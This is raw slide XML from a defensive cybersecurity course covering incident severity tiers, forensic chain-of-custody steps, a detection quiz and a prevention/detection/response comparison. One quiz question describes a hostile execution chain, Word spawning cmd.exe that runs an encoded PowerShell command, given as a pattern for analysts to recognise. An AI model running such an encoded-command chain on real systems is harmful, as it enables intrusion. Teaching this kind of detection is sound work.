                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>CISO + CSIRT + Legal</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="482393">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>SEV-2 (High)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Confirmed compromise of one system; no confirmed lateral movement</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>LSASS access detected; Cobalt Strike beacon identified</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>30 minutes</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>CSIRT Lead + Manager</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="482393">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>SEV-3 (Medium)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Suspicious behavioral indicator; unconfirmed compromise</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Multiple failed logons followed by success; registry modification</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>4 hours</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>SOC Analyst Tier 2</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="482393">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>SEV-4 (Low)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Known-good behavior flagged by detection rule; likely false positive</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Administrative script matched persistence detection rule</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>24 hours</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>SOC Analyst Tier 1</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="482394">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>SEV-5 (Info)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Informational event; no immediate action required</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Routine logon from known workstation during business hours</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Next business day</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Log for trend analysis</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>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Forensics Chain of Custody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Chain of custody</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> is the documented, unbroken record of who possessed digital evidence, when, and under what conditions. A broken chain of custody can render forensic evidence inadmissible in legal proceedings and undermine prosecution efforts.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Forensics Chain of Custody (2/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="19_chain_of_custody.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Chain of custody lifecycle: every transfer of digital evidence must be documented with handler identity, timestamp, and purpose to maintain forensic integrity from seizure to courtroom.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Forensics Chain of Custody (3/3)</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Identify and Document:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Before touching any device, photograph it in place and document its physical state, location, and date/time of discovery.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Assign Evidence Tag:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Apply a unique evidence identification number and affix a tamper-evident evidence seal to all physical media.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Acquire Image:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Create a forensic image (bit-for-bit copy) using a write-blocker to prevent any modification to the original evidence.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Verify Hash:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Compute MD5 and SHA-256 hashes of both the original media and the forensic image; verify they match exactly.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Document Each Transfer:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Record every transfer of the evidence with the handler's name, badge number, date, time, and purpose.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Secure Storage:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Store original evidence in a locked, access-controlled evidence locker; maintain logs of all access.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Mid-Unit Checkpoint, Detection Concepts Review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Take five minutes to answer these concept check questions individually before comparing answers with your neighbor. These questions reflect common exam and interview topics in endpoint detection and digital forensics.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Mid-Unit Checkpoint, Detection Concepts Review (2/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="19_checkpoint_review.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1330000"/>
            <a:ext cx="10555354" cy="3839510"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="520951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Mid-unit knowledge check: individual reflection followed by partner discussion reinforces key concepts before the class continues to advanced topics.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Mid-Unit Checkpoint, Detection Concepts Review (3/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1330000"/>
            <a:ext cx="10555354" cy="2032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Q1:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> An analyst observes </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>winword.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> spawning </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>cmd.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, which then executes </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>powershell.exe -enc [base64string]</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>. Which MITRE ATT&amp;CK technique does this represent, and which Sysmon event ID captures it?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Q2:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> A threat intelligence report states that APT29 uses a specific C2 IP address. According to the Pyramid of Pain, how durable is this indicator, and what higher-value indicator would you prioritize instead?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Q3:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> A first responder at an incident scene wants to "just reboot" a compromised workstation to stop malware execution. What RFC-referenced principle are they violating, and what data would be lost?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Q4:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> What is the difference between a SIEM correlation rule and threat hunting? When is each approach more appropriate?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Q5:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> A SOC analyst observes Security Event ID 4662 with DS-Replication-Get-Changes-All from a user workstation account. What attack is likely occurring, and what MITRE ATT&amp;CK technique ID applies?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Prevention vs. Detection vs. Response, A Comparison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Effective security programs require balanced investment across </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Prevention</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Detection</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, and </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Response</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> capabilities. Over-investment in any single function at the expense of others creates exploitable gaps.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Prevention vs. Detection vs. Response, A Comparison (2/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="19_prevention_detection_response_comparison.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Prevention, Detection, and Response compared: each function addresses different phases of an attack lifecycle and has distinct failure modes that the others compensate for.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Prevention vs. Detection vs. Response, A Comparison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Prevention</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Detection</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Response</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="303307">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Goal</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Stop the attack before it succeeds</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Identify an attack in progress or completed</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Contain damage and restore normal operations</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="303307">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Primary Technologies</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Firewall, AV, patching, MFA, access control</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>SIEM, EDR, Sysmon, network monitoring</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>SOAR, IR playbooks, forensics tools</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
